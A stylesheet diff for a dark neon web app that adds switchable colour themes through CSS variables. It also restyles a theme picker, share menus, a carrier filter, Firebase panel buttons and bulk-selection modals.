@@ -13,7 +13,9 @@
 :root {
   --primary: #c240ff;
   --primary-glow: #e066ff;
+  --primary-rgb: 194, 64, 255;
   --bg-dark: #000000;
+  --bg-deep: #010102;
   
   --text-main: #e9d5ff; 
   --text-bright: #d8b4fe; 
@@ -23,6 +25,93 @@
   --obsidian-glow: rgba(82, 82, 91, 0.4); 
   --obsidian-glow-strong: rgba(113, 113, 122, 0.6);
   --silver-sweep: rgba(229, 231, 235, 0.06);
+  --canvas-accent-rgb: 74, 42, 120;
+  --fog-one: rgba(128,86,205,.2);
+  --fog-two: rgba(105,62,180,.15);
+  --fog-three: rgba(130,78,215,.15);
+  --particle-main: #d1b9ff;
+  --particle-glow: #a965ff;
+  --particle-glow-soft: rgba(155,90,255,.95);
+}
+
+body[data-theme="matrix"] {
+  --primary: #00ff80;
+  --primary-glow: #67ffc0;
+  --primary-rgb: 0, 255, 128;
+  --text-main: #d9ffeb;
+  --text-bright: #8cffc2;
+  --text-dim: #7ab997;
+  --obsidian-border: #183528;
+  --obsidian-glow: rgba(0,255,128,.23);
+  --obsidian-glow-strong: rgba(0,255,128,.42);
+  --silver-sweep: rgba(0,255,128,.07);
+  --canvas-accent-rgb: 0, 120, 72;
+  --fog-one: rgba(0,255,128,.16);
+  --fog-two: rgba(0,180,120,.12);
+  --fog-three: rgba(90,255,180,.12);
+  --particle-main: #b9ffd8;
+  --particle-glow: #00ff80;
+  --particle-glow-soft: rgba(0,255,128,.9);
+}
+
+body[data-theme="ice"] {
+  --primary: #00d9ff;
+  --primary-glow: #9decff;
+  --primary-rgb: 0, 217, 255;
+  --text-main: #d9f6ff;
+  --text-bright: #b8efff;
+  --text-dim: #8fb6c2;
+  --obsidian-border: #1f3d46;
+  --obsidian-glow: rgba(0,217,255,.22);
+  --obsidian-glow-strong: rgba(0,217,255,.42);
+  --silver-sweep: rgba(180,240,255,.08);
+  --canvas-accent-rgb: 0, 110, 150;
+  --fog-one: rgba(0,217,255,.14);
+  --fog-two: rgba(80,180,255,.12);
+  --fog-three: rgba(160,240,255,.12);
+  --particle-main: #d8f8ff;
+  --particle-glow: #00d9ff;
+  --particle-glow-soft: rgba(0,217,255,.9);
+}
+
+body[data-theme="alert"] {
+  --primary: #ff3366;
+  --primary-glow: #ff7a9b;
+  --primary-rgb: 255, 51, 102;
+  --text-main: #ffe1e8;
+  --text-bright: #ffb4c8;
+  --text-dim: #b98d99;
+  --obsidian-border: #3a1b25;
+  --obsidian-glow: rgba(255,51,102,.22);
+  --obsidian-glow-strong: rgba(255,51,102,.42);
+  --silver-sweep: rgba(255,120,155,.08);
+  --canvas-accent-rgb: 160, 20, 58;
+  --fog-one: rgba(255,51,102,.14);
+  --fog-two: rgba(210,35,80,.12);
+  --fog-three: rgba(255,120,155,.12);
+  --particle-main: #ffd8e2;
+  --particle-glow: #ff3366;
+  --particle-glow-soft: rgba(255,51,102,.9);
+}
+
+body[data-theme="gold"] {
+  --primary: #ffd166;
+  --primary-glow: #ffe29b;
+  --primary-rgb: 255, 209, 102;
+  --text-main: #fff1cf;
+  --text-bright: #ffe29b;
+  --text-dim: #b6a27a;
+  --obsidian-border: #3b321f;
+  --obsidian-glow: rgba(255,209,102,.22);
+  --obsidian-glow-strong: rgba(255,209,102,.4);
+  --silver-sweep: rgba(255,220,140,.08);
+  --canvas-accent-rgb: 150, 105, 15;
+  --fog-one: rgba(255,209,102,.13);
+  --fog-two: rgba(210,165,70,.11);
+  --fog-three: rgba(255,230,150,.1);
+  --particle-main: #fff0c7;
+  --particle-glow: #ffd166;
+  --particle-glow-soft: rgba(255,209,102,.9);
 }
 
 html, body { 
@@ -34,21 +123,21 @@ html, body {
 
 #cyberCanvas { 
   position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; 
-  background: radial-gradient(ellipse at 50% 20%,rgba(74,42,120,.03),transparent 40%), linear-gradient(#000,#010102 72%,#000);
+  background: radial-gradient(ellipse at 50% 20%,rgba(var(--canvas-accent-rgb),.07),transparent 40%), linear-gradient(var(--bg-dark),var(--bg-deep) 72%,var(--bg-dark));
 }
 
 .fog { position: fixed; inset: -80px; z-index: 1; pointer-events: none; filter: blur(34px); opacity: 0.25; }
 .fog i { position: absolute; border-radius: 50%; display: block; }
-.fog1 { width: 620px; height: 220px; left: 10%; top: 10%; background: radial-gradient(ellipse,rgba(128,86,205,.2),transparent 70%); animation: fog1 18s ease-in-out infinite alternate; }
-.fog2 { width: 680px; height: 250px; right: 5%; top: 30%; background: radial-gradient(ellipse,rgba(105,62,180,.15),transparent 70%); animation: fog2 24s ease-in-out infinite alternate; }
-.fog3 { width: 620px; height: 210px; left: 20%; bottom: 5%; background: radial-gradient(ellipse,rgba(130,78,215,.15),transparent 72%); animation: fog3 21s ease-in-out infinite alternate; }
+.fog1 { width: 620px; height: 220px; left: 10%; top: 10%; background: radial-gradient(ellipse,var(--fog-one),transparent 70%); animation: fog1 18s ease-in-out infinite alternate; }
+.fog2 { width: 680px; height: 250px; right: 5%; top: 30%; background: radial-gradient(ellipse,var(--fog-two),transparent 70%); animation: fog2 24s ease-in-out infinite alternate; }
+.fog3 { width: 620px; height: 210px; left: 20%; bottom: 5%; background: radial-gradient(ellipse,var(--fog-three),transparent 72%); animation: fog3 21s ease-in-out infinite alternate; }
 
 @keyframes fog1 { to { transform: translate(150px,35px) rotate(5deg); } }
 @keyframes fog2 { to { transform: translate(-150px,-25px) rotate(-6deg); } }
 @keyframes fog3 { to { transform: translate(-100px,-35px) scale(1.15); } }
 
 #particles { position: fixed; z-index: 1; left: 0; right: 0; bottom: 0; height: 145px; pointer-events: none; overflow: hidden; }
-.p { position: absolute; bottom: -5px; width: 2px; height: 2px; border-radius: 50%; background: #d1b9ff; box-shadow: 0 0 5px #a965ff, 0 0 14px rgba(155,90,255,.95); animation: rise var(--dur) linear var(--delay) infinite; }
+.p { position: absolute; bottom: -5px; width: 2px; height: 2px; border-radius: 50%; background: var(--particle-main); box-shadow: 0 0 5px var(--particle-glow), 0 0 14px var(--particle-glow-soft); animation: rise var(--dur) linear var(--delay) infinite; }
 @keyframes rise { 
   0% { transform: translate3d(0,0,0) scale(.55); opacity: 0; } 
   12% { opacity: .95; } 
@@ -59,7 +148,7 @@ html, body {
 #obsidian-core-glow {
     position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
     width: 90vw; height: 90vw; max-width: 800px; max-height: 800px;
-    background: radial-gradient(circle, rgba(113, 113, 122, 0.12) 0%, rgba(39, 39, 42, 0.18) 25%, transparent 65%);
+    background: radial-gradient(circle, rgba(var(--primary-rgb), 0.08) 0%, rgba(39, 39, 42, 0.18) 25%, transparent 65%);
     z-index: 1; pointer-events: none; animation: coreBreathe 10s infinite alternate ease-in-out;
 }
 @keyframes coreBreathe { 0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0.7; } 100% { transform: translate(-50%, -50%) scale(1.05); opacity: 1; } }
@@ -73,7 +162,7 @@ html, body {
 .void-sweep > * { position: relative; z-index: 2; }
 
 #toast-container { position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%); z-index: 100000; display: flex; flex-direction: column; gap: 10px; pointer-events: none; align-items: center; width: 90%;}
-.cyber-toast { background: rgba(2, 2, 4, 0.95); border: 1px solid var(--primary); color: #fff; padding: 12px 20px; border-radius: 12px; font-size: 11px; font-weight: 800; letter-spacing: 1px; box-shadow: 0 0 20px rgba(194,64,255,0.4); animation: slideUpToast 0.3s cubic-bezier(0.2,1,0.2,1) forwards, fadeOutToast 0.3s ease-in 2.7s forwards; text-transform: uppercase; font-family: 'JetBrains Mono', monospace; text-align: center;}
+.cyber-toast { background: rgba(2, 2, 4, 0.95); border: 1px solid var(--primary); color: #fff; padding: 12px 20px; border-radius: 12px; font-size: 11px; font-weight: 800; letter-spacing: 1px; box-shadow: 0 0 20px rgba(var(--primary-rgb),0.4); animation: slideUpToast 0.3s cubic-bezier(0.2,1,0.2,1) forwards, fadeOutToast 0.3s ease-in 2.7s forwards; text-transform: uppercase; font-family: 'JetBrains Mono', monospace; text-align: center;}
 @keyframes slideUpToast { from { opacity: 0; transform: translateY(30px) scale(0.9); } to { opacity: 1; transform: translateY(0) scale(1); } }
 @keyframes fadeOutToast { to { opacity: 0; transform: translateY(-10px); } }
 
@@ -84,31 +173,74 @@ html, body {
 .confirm-btns .cyber-btn { flex: 1; padding: 12px; font-size: 11px; }
 
 #splash { position: fixed; inset: 0; display: flex; justify-content: center; align-items: center; background: var(--bg-dark); z-index: 99999; }
-#splash .logo { font-size: 50px; font-weight: 900; letter-spacing: 6px; color: var(--text-bright); text-shadow: 0 0 13px var(--primary), 0 0 27px rgba(194,64,255,.6); animation: coreBurst 1.4s cubic-bezier(.2,1,.2,1); }
+#splash .logo { font-size: 50px; font-weight: 900; letter-spacing: 6px; color: var(--text-bright); text-shadow: 0 0 13px var(--primary), 0 0 27px rgba(var(--primary-rgb),.6); animation: coreBurst 1.4s cubic-bezier(.2,1,.2,1); }
 @keyframes coreBurst { 0% { transform: scale(.5); opacity: 0; filter: blur(10px); } 70% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
 .hideSplash { animation: fadeOut 0.8s forwards; } 
 @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
 
 #optionSplash { position: fixed; inset: 0; display: none; justify-content: center; align-items: center; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); z-index: 99998; }
-#optionSplash h1 { font-size: 35px; font-weight: 800; color: var(--text-bright); text-shadow: 0 0 13px var(--primary), 0 0 27px rgba(194,64,255,.6); animation: zoomIn .5s cubic-bezier(.2,1,.2,1); letter-spacing: 3px; text-transform: uppercase; }
+#optionSplash h1 { font-size: 35px; font-weight: 800; color: var(--text-bright); text-shadow: 0 0 13px var(--primary), 0 0 27px rgba(var(--primary-rgb),.6); animation: zoomIn .5s cubic-bezier(.2,1,.2,1); letter-spacing: 3px; text-transform: uppercase; }
 @keyframes zoomIn { 0% { transform: scale(.6); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
-.top-bar { display: flex; justify-content: space-between; padding: 20px 25px 5px 25px; position: relative; z-index: 10; }
+.top-bar { display: flex; justify-content: space-between; padding: 20px 25px 5px 25px; position: relative; z-index: 3001; }
+.top-bar-actions { display:flex; align-items:center; gap:8px; }
+.top-share-btn { height:40px; padding:0 12px; border:1px solid rgba(0,255,128,.68); border-radius:8px; background:rgba(0,255,128,.035); color:#00ff80; cursor:pointer; font-size:10px; font-weight:900; letter-spacing:1px; box-shadow:0 0 13px rgba(0,255,128,.18); }
+.top-share-btn:active { transform:scale(.94); }
+.share-menu-wrap { position:relative; display:flex; gap:3px; z-index:3200; }
+.share-menu-toggle { width:28px; height:40px; border:1px solid rgba(0,255,128,.68); border-radius:8px; background:rgba(0,255,128,.035); color:#00ff80; cursor:pointer; font-size:14px; line-height:1; box-shadow:0 0 13px rgba(0,255,128,.18); }
+.share-menu-toggle:active { transform:scale(.94); }
+.share-action-menu { display:none; position:absolute; top:46px; right:0; width:188px; padding:5px; z-index:2; background:#020204; border:1px solid var(--obsidian-border); border-radius:8px; box-shadow:0 0 22px rgba(0,0,0,.8), 0 0 14px var(--obsidian-glow); }
+.share-action-menu.open { display:block; }
+.share-action-menu button { width:100%; min-height:34px; text-align:left; padding:0 10px; border:0; background:transparent; color:var(--text-main); cursor:pointer; font-size:9px; font-weight:800; letter-spacing:1px; }
+.share-action-menu button:active { background:rgba(0,255,128,.12); color:#00ff80; }
+.theme-picker-wrap { position:relative; z-index:3200; }
+.theme-toggle-btn { height:40px; min-width:40px; padding:0 11px; display:flex; align-items:center; gap:7px; border:1px solid var(--obsidian-border); border-radius:10px; background:rgba(0,0,2,.78); color:var(--text-bright); cursor:pointer; font-size:10px; font-weight:900; letter-spacing:1px; box-shadow:0 0 14px var(--obsidian-glow); }
+.theme-toggle-btn:active { transform:scale(.94); box-shadow:0 0 22px var(--obsidian-glow-strong); }
+.theme-swatch { width:14px; height:14px; border-radius:50%; flex:0 0 auto; background:var(--primary); box-shadow:0 0 10px var(--primary); border:1px solid rgba(255,255,255,.35); }
+.theme-menu { display:none; position:absolute; top:46px; right:0; width:176px; padding:7px; border:1px solid var(--obsidian-border); border-radius:12px; background:#020204; box-shadow:0 0 24px rgba(0,0,0,.9), 0 0 18px var(--obsidian-glow); z-index:1; pointer-events:auto; }
+.theme-menu.open { display:block; }
+.theme-option { width:100%; height:36px; border:0; border-radius:8px; background:transparent; color:var(--text-main); cursor:pointer; display:flex; align-items:center; gap:9px; padding:0 10px; font-size:10px; font-weight:900; letter-spacing:1px; text-align:left; }
+.theme-option:hover, .theme-option.active { background:rgba(var(--primary-rgb),.12); color:var(--text-bright); }
+.theme-option .theme-swatch { width:13px; height:13px; box-shadow:0 0 10px currentColor; }
+.theme-option[data-theme-key="void"] .theme-swatch { background:#c240ff; color:#c240ff; }
+.theme-option[data-theme-key="matrix"] .theme-swatch { background:#00ff80; color:#00ff80; }
+.theme-option[data-theme-key="ice"] .theme-swatch { background:#00d9ff; color:#00d9ff; }
+.theme-option[data-theme-key="alert"] .theme-swatch { background:#ff3366; color:#ff3366; }
+.theme-option[data-theme-key="gold"] .theme-swatch { background:#ffd166; color:#ffd166; }
+@media (max-width:420px) {
+  .top-bar { padding-left:18px; padding-right:18px; }
+  .top-bar-actions { gap:6px; }
+  .theme-toggle-btn { padding:0 9px; }
+  .theme-label { display:none; }
+}
 .icon-btn { width: 40px; height: 40px; border-radius: 12px; font-size: 18px; border: 1px solid var(--obsidian-border); background: rgba(0,0,2,.78); color: var(--text-main); box-shadow: 0 0 14px var(--obsidian-glow); display: flex; justify-content: center; align-items: center; transition: 0.2s; cursor: pointer; }
 .icon-btn:active { transform: scale(0.95); box-shadow: 0 0 27px var(--obsidian-glow-strong); }
 
 .hero { padding: 0 25px 15px 25px; position: relative; z-index: 10; display: flex; flex-direction: column; gap: 15px; }
+body.targets-screen-active .app-hero { display:none; }
 .hero-info p { margin: 0; font-size: 14px; color: var(--text-dim); font-weight: 600; letter-spacing: 1px; text-transform: uppercase;}
-.hero-info h1 { margin: 5px 0; font-size: 42px; font-weight: 900; letter-spacing: 1px; color: var(--text-bright); text-shadow: 0 0 15px var(--primary), 0 0 30px rgba(194, 64, 255, 0.4); line-height: 1; }
+.hero-info h1 { margin: 5px 0; font-size: 42px; font-weight: 900; letter-spacing: 1px; color: var(--text-bright); text-shadow: 0 0 15px var(--primary), 0 0 30px rgba(var(--primary-rgb), 0.4); line-height: 1; }
 .hero-info .subtext { font-size: 13px; color: var(--text-dim); }
 .glow-line { margin-top: 15px; width: 50px; height: 3px; background: var(--primary); border-radius: 5px; box-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary); }
 
-.hero-search { width: 100%; position: relative; z-index: 10; padding: 0 20px; margin-bottom: 5px; }
+.hero-search { width: 100%; position: relative; z-index: 2500; padding: 0 20px; margin-bottom: 5px; }
+.carrier-filter-row { display:none; justify-content:flex-end; align-items:center; gap:8px; margin-bottom:8px; position:relative; z-index:2600; }
+body.targets-screen-active .carrier-filter-row { display:flex; }
+.carrier-filter-wrap { position:relative; width:155px; z-index:2700; }
+.carrier-filter-input { width:100%; height:36px; padding:0 34px 0 12px; border-radius:10px; border:1px solid var(--obsidian-border); background:#020204; color:var(--text-bright); outline:none; cursor:pointer; font-size:10px; font-weight:900; letter-spacing:1px; box-shadow:inset 0 0 13px rgba(0,0,0,.75), 0 0 12px var(--obsidian-glow); text-transform:uppercase; user-select:none; caret-color:transparent; }
+.carrier-filter-wrap::after { content:"▾"; position:absolute; right:11px; top:50%; transform:translateY(-50%); color:var(--text-dim); font-size:12px; pointer-events:none; }
+.carrier-filter-menu { display:none; position:absolute; top:42px; right:0; width:155px; padding:5px; background:#020204; border:1px solid var(--obsidian-border); border-radius:10px; box-shadow:0 0 22px rgba(0,0,0,.85), 0 0 16px var(--obsidian-glow); z-index:3000; pointer-events:auto; }
+.carrier-filter-menu.open { display:block; }
+.carrier-filter-menu button { width:100%; height:34px; border:0; background:transparent; color:var(--text-main); cursor:pointer; text-align:left; padding:0 10px; font-size:10px; font-weight:900; letter-spacing:1px; }
+.carrier-filter-menu button:active, .carrier-filter-menu button.active { color:var(--text-bright); background:rgba(var(--primary-rgb),.13); }
+.carrier-reset-btn { height:36px; padding:0 12px; border-radius:10px; border:1px solid rgba(255,51,102,.62); background:rgba(255,51,102,.045); color:#ff668a; cursor:pointer; font-size:10px; font-weight:900; letter-spacing:1px; box-shadow:0 0 12px rgba(255,51,102,.18); }
+.carrier-reset-btn:active { transform:scale(.94); background:rgba(255,51,102,.16); }
 .global-search { width: 100%; padding: 12px 15px; border-radius: 15px; font-size: 12px; border: 1px solid var(--obsidian-border); background: #020204; color: var(--text-bright); box-shadow: inset 0 0 15px rgba(0,0,0,0.8); outline: none; transition: 0.3s; font-family: 'Inter', sans-serif; font-weight: 600;}
 .global-search:focus { box-shadow: 0 0 20px var(--obsidian-glow-strong); border-color: #3f3f46; }
 .global-search::placeholder { color: var(--text-dim); font-weight: 400;}
 
 .swipeWrap { position: relative; height: calc(100dvh - 250px); width: 100%; touch-action: pan-y; z-index: 10; } 
+body.targets-screen-active .swipeWrap { height: calc(100dvh - 78px); }
 .screen { position: absolute; width: 100%; height: 100%; padding: 0 20px; box-sizing: border-box; transition: 0.4s cubic-bezier(.25,1,.25,1); will-change: transform, opacity; overflow-y: auto; overscroll-behavior: contain; -webkit-overflow-scrolling: touch; padding-bottom: calc(120px + env(safe-area-inset-bottom)); }
 .screen::-webkit-scrollbar { display: none; }
 .active { transform: translateX(0); opacity: 1; z-index: 5; }
@@ -124,9 +256,9 @@ html, body {
 .grid-card:active { transform: scale(0.95); }
 .grid-card > *:not(.outline-edge) { position: relative; z-index: 2; }
 
-.icon-ring { width: 35px; height: 35px; border-radius: 50%; font-size: 16px; margin-bottom: 10px; border: 1px solid var(--obsidian-border); display: flex; justify-content: center; align-items: center; box-shadow: inset 0 0 12px rgba(194,64,255,.15); text-shadow: 0 0 9px var(--primary); background: transparent; color: var(--text-bright); transform: translateZ(10px); z-index: 2; }
+.icon-ring { width: 35px; height: 35px; border-radius: 50%; font-size: 16px; margin-bottom: 10px; border: 1px solid var(--obsidian-border); display: flex; justify-content: center; align-items: center; box-shadow: inset 0 0 12px rgba(var(--primary-rgb),.15); text-shadow: 0 0 9px var(--primary); background: transparent; color: var(--text-bright); transform: translateZ(10px); z-index: 2; }
 .g-title { font-size: 9px; color: var(--text-dim); font-weight: 800; margin-bottom: 5px; letter-spacing: 1px; text-transform: uppercase; transform: translateZ(5px); z-index: 2; }
-.g-val { font-size: 18px; font-weight: 900; color: var(--text-bright); text-shadow: 0 0 12px var(--primary), 0 0 20px rgba(194,64,255,.6); transform: translateZ(10px); z-index: 2; }
+.g-val { font-size: 18px; font-weight: 900; color: var(--text-bright); text-shadow: 0 0 12px var(--primary), 0 0 20px rgba(var(--primary-rgb),.6); transform: translateZ(10px); z-index: 2; }
 .g-val.scan-mode { font-size: 13px; color: #00e5ff; text-shadow: 0 0 12px rgba(0,229,255,0.75), 0 0 20px rgba(0,229,255,.45); }
 .g-scan-status { display: none; margin-top: 5px; font-size: 8px; font-weight: 900; letter-spacing: 1.2px; color: #00ff80; text-shadow: 0 0 10px rgba(0,255,128,0.85); }
 .g-scan-status.active { display: block; }
@@ -157,7 +289,7 @@ html, body {
 .cyber-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
 .fb-expand-btn { width: 100%; background: transparent; border: 1px dashed var(--obsidian-border); color: var(--text-dim); padding: 8px; margin-top: 8px; font-size: 10px; font-weight: 800; cursor: pointer; transition: 0.2s; border-radius: 8px; letter-spacing: 1px; box-shadow: 0 0 10px rgba(0,0,0,0.5); position: relative; z-index: 2;}
-.fb-expand-btn:active { background: rgba(194,64,255,0.1); color: var(--text-bright); border-color: var(--primary); }
+.fb-expand-btn:active { background: rgba(var(--primary-rgb),0.1); color: var(--text-bright); border-color: var(--primary); }
 
 .filter-container { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; flex-wrap: wrap; }
 .filter-chip { background: transparent; border: 1px solid var(--obsidian-border); color: var(--text-dim); padding: 8px 18px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: 1px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 13px var(--obsidian-glow); }
@@ -166,15 +298,15 @@ html, body {
 .target-list { height: auto; }
 .empty-state { text-align: center; color: var(--text-dim); margin-top: 30px; font-size: 13px; font-style: italic; }
 
-.target-card-wrapper { position: relative; margin-top: 15px; margin-bottom: 20px; content-visibility: auto; contain-intrinsic-size: auto 156px; }
-.target-serial { position: absolute; top: -10px; left: 15px; font-size: 9px; padding: 4px 12px; background: #020204; border: 1px solid var(--obsidian-border); border-radius: 10px; color: var(--text-bright); font-weight: 900; box-shadow: 0 0 10px var(--obsidian-glow); letter-spacing: 1px; z-index: 10; }
+.target-card-wrapper { position: relative; margin-top: 5px; margin-bottom: 20px; padding-top: 10px; content-visibility: visible; contain: layout style; }
+.target-serial { position: absolute; top: 0; left: 15px; font-size: 9px; padding: 4px 12px; background: #020204; border: 1px solid var(--obsidian-border); border-radius: 10px; color: var(--text-bright); font-weight: 900; box-shadow: 0 0 10px var(--obsidian-glow); letter-spacing: 1px; z-index: 10; }
 .target-wireframe { padding: 18px 15px 12px 15px; border-radius: 15px; border: 1px solid transparent; background: transparent; position: relative; overflow: visible; cursor: pointer; transition: 0.3s; z-index: 1; }
 .target-card-wrapper:hover .target-wireframe { transform: translateY(-2px); }
 
 .ext-badges { display: flex; gap: 4px; flex-wrap: wrap; justify-content: flex-end;}
 .ext-badge { padding: 2px 6px; border-radius: 4px; font-size: 8px; font-weight: 800; border: 1px solid; letter-spacing: 1px;}
-.bdg-used { background: rgba(194, 64, 255, 0.1); border-color: var(--primary); color: var(--text-bright); text-shadow: 0 0 10px var(--primary); }
-.bdg-fav { background: rgba(216, 180, 254, 0.1); border-color: #d8b4fe; color: #d8b4fe; text-shadow: 0 0 10px #d8b4fe; }
+.bdg-used { background: rgba(var(--primary-rgb), 0.1); border-color: var(--primary); color: var(--text-bright); text-shadow: 0 0 10px var(--primary); }
+.bdg-fav { background: rgba(var(--primary-rgb), 0.1); border-color: var(--primary-glow); color: var(--primary-glow); text-shadow: 0 0 10px var(--primary-glow); }
 
 .bdg-bank { background: rgba(0, 255, 128, 0.05); border-color: rgba(0, 255, 128, 0.4); color: #00ff80; text-shadow: 0 0 10px rgba(0, 255, 128, 0.8); font-size: 9px !important; padding: 4px 8px !important; margin-top: 6px; display: inline-block; font-family: 'JetBrains Mono', monospace;}
 
@@ -183,33 +315,91 @@ html, body {
 .fb-url { font-size: 11px; color: var(--text-main); font-family: 'JetBrains Mono', monospace; word-break: break-all; flex: 1; }
 .connection-btn { padding: 5px 12px; border-radius: 8px; font-size: 10px; font-weight: 800; border: 1px solid var(--obsidian-border); cursor: pointer; background: transparent; color: var(--text-bright); transition: 0.2s; box-shadow: 0 0 10px var(--obsidian-glow); }
 .connection-btn:active { transform: scale(0.95); }
-.delete-btn { padding: 5px 8px; border-radius: 8px; font-size: 10px; font-weight: 800; border: 1px solid rgba(194,64,255,.5); color: var(--primary); cursor: pointer; background: transparent; margin-left: 5px; transition: 0.2s; box-shadow: 0 0 10px rgba(194,64,255,.2); }
+.delete-btn { padding: 5px 8px; border-radius: 8px; font-size: 10px; font-weight: 800; border: 1px solid rgba(var(--primary-rgb),.5); color: var(--primary); cursor: pointer; background: transparent; margin-left: 5px; transition: 0.2s; box-shadow: 0 0 10px rgba(var(--primary-rgb),.2); }
 .delete-btn:active { background: var(--primary); color: #fff; }
+.firebase-delete-btn { width:38px; height:38px; padding:0; margin-left:5px; display:inline-flex; align-items:center; justify-content:center; border-radius:8px; border:1px solid rgba(255,51,102,.72); background:rgba(255,51,102,.07); color:#ff668a; cursor:pointer; font-size:16px; line-height:1; box-shadow:0 0 12px rgba(255,51,102,.22); transition:transform .2s, background .2s, box-shadow .2s; }
+.firebase-delete-btn svg { width:17px; height:17px; fill:none; stroke:currentColor; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
+.firebase-delete-btn:active { transform:scale(.92); background:rgba(255,51,102,.25); box-shadow:0 0 18px rgba(255,51,102,.45); }
+.firebase-panel-head { display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:8px; }
+.firebase-panel-head h3 { margin:0; }
+.firebase-toolbar { display:flex; align-items:center; gap:6px; flex-shrink:0; }
+.firebase-command, .firebase-menu-toggle { height:40px; border:1px solid rgba(0,255,128,.68); background:rgba(0,255,128,.035); color:#00ff80; cursor:pointer; font-size:10px; font-weight:900; letter-spacing:1px; box-shadow:0 0 13px rgba(0,255,128,.18); }
+.firebase-command { padding:0 10px; border-radius:8px; }
+.firebase-menu-toggle { width:28px; border-radius:8px; font-size:14px; line-height:1; }
+.firebase-command.delete-command { border-color:rgba(255,51,102,.68); background:rgba(255,51,102,.035); color:#ff668a; box-shadow:0 0 11px rgba(255,51,102,.2); }
+.firebase-menu-wrap.delete-menu-wrap .firebase-menu-toggle { border-color:rgba(255,51,102,.68); background:rgba(255,51,102,.035); color:#ff668a; box-shadow:0 0 11px rgba(255,51,102,.2); }
+.firebase-command:active, .firebase-menu-toggle:active { transform:scale(.94); }
+.firebase-menu-wrap { position:relative; display:flex; gap:3px; }
+.firebase-action-menu { display:none; position:absolute; top:38px; right:0; width:190px; padding:5px; z-index:40; background:#020204; border:1px solid var(--obsidian-border); border-radius:8px; box-shadow:0 0 22px rgba(0,0,0,.8), 0 0 14px var(--obsidian-glow); }
+.firebase-action-menu.open { display:block; }
+.firebase-action-menu button { width:100%; min-height:34px; text-align:left; padding:0 10px; border:0; background:transparent; color:var(--text-main); cursor:pointer; font-size:9px; font-weight:800; letter-spacing:1px; }
+.firebase-action-menu button:active { background:rgba(var(--primary-rgb),.12); color:var(--text-bright); }
+.firebase-action-menu.delete-menu button:active { background:rgba(255,51,102,.12); color:#ff668a; }
+.bulk-modal-body { padding:12px 20px; flex:1; min-height:0; overflow-y:auto; -webkit-overflow-scrolling:touch; }
+.bulk-choice { display:flex; align-items:center; gap:12px; padding:12px 0; border-bottom:1px dashed var(--obsidian-border); }
+.bulk-choice input { width:18px; height:18px; accent-color:var(--primary); flex:0 0 auto; }
+.bulk-choice label { min-width:0; color:var(--text-main); font-family:'JetBrains Mono', monospace; font-size:11px; word-break:break-all; cursor:pointer; }
+.bulk-minimum { padding:20px; border-bottom:1px solid var(--obsidian-border); }
+.bulk-minimum p { margin:0 0 10px; color:var(--text-dim); font-size:12px; line-height:1.45; }
+.bulk-footer { padding:14px 20px calc(14px + env(safe-area-inset-bottom)); border-top:1px solid var(--obsidian-border); }
+.bulk-footer .cyber-btn { width:100%; min-height:44px; }
+.share-step-copy { margin:0; color:var(--text-dim); font-size:11px; line-height:1.45; }
+.share-selection-count { color:var(--text-bright); font-family:'JetBrains Mono', monospace; font-size:10px; font-weight:800; text-shadow:0 0 10px var(--primary); }
+.share-type-grid { display:grid; grid-template-columns:1fr; gap:10px; }
+.share-type-card { width:100%; min-height:82px; padding:14px; border:1px solid var(--obsidian-border); border-radius:8px; background:rgba(255,255,255,.02); color:var(--text-main); cursor:pointer; text-align:left; font-family:'Inter',sans-serif; }
+.share-type-card.active { border-color:var(--primary); color:var(--text-bright); box-shadow:0 0 16px rgba(var(--primary-rgb),.18); background:rgba(var(--primary-rgb),.06); }
+.share-type-title { display:block; margin-bottom:5px; font-size:11px; font-weight:900; letter-spacing:1px; }
+.share-type-desc { display:block; color:var(--text-dim); font-size:10px; line-height:1.4; }
+.share-protection-title { margin:18px 0 8px; color:var(--text-dim); font-size:9px; font-weight:900; letter-spacing:1px; }
+.share-protection-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+.share-protection-card { min-height:54px; padding:10px; border:1px solid var(--obsidian-border); border-radius:8px; background:rgba(255,255,255,.02); color:var(--text-main); cursor:pointer; font-size:9px; font-weight:900; letter-spacing:1px; }
+.share-protection-card.active { border-color:#00ff80; color:#00ff80; background:rgba(0,255,128,.06); box-shadow:0 0 13px rgba(0,255,128,.14); }
+.share-field { display:none; margin-top:14px; }
+.share-field.open { display:block; }
+.share-footer { padding:14px 20px calc(14px + env(safe-area-inset-bottom)); border-top:1px solid var(--obsidian-border); display:flex; gap:8px; }
+.share-footer .cyber-btn { flex:1; min-height:44px; }
+@media (max-width:480px) { .firebase-panel-head { align-items:flex-start; } .firebase-toolbar { gap:4px; } .firebase-command { padding:0 8px; font-size:8px; } .firebase-menu-toggle { width:28px; } }
 
 .target-modal { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(15px); z-index: 10001; display: flex; flex-direction: column; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.2, 1, 0.2, 1); opacity: 0; pointer-events: none; }
 .target-modal.open { transform: translateY(0); opacity: 1; pointer-events: auto; }
 
 /* MODAL SPACING FIXES */
-.modal-header { padding: 20px 20px 10px 20px; display: flex; flex-direction: column; gap: 15px; border-bottom: 1px solid var(--obsidian-border); background: transparent; }
+.modal-header { padding: 20px 20px 10px 20px; display: flex; flex-direction: column; gap: 15px; border-bottom: 1px solid var(--obsidian-border); background: transparent; position: relative; }
 .modal-title-row { display: flex; justify-content: space-between; align-items: flex-start; width: 100%;}
 .modal-title-area { display: flex; flex-direction: column; gap: 3px; }
 .modal-title { font-size: 20px; font-weight: 900; color: var(--text-bright); letter-spacing: 1px; text-shadow: 0 0 15px var(--primary); margin: 0; }
 #m-device-cluster { font-size: 9px; color: var(--text-dim); font-weight: 700; letter-spacing: 1px; font-family: 'JetBrains Mono', monospace;}
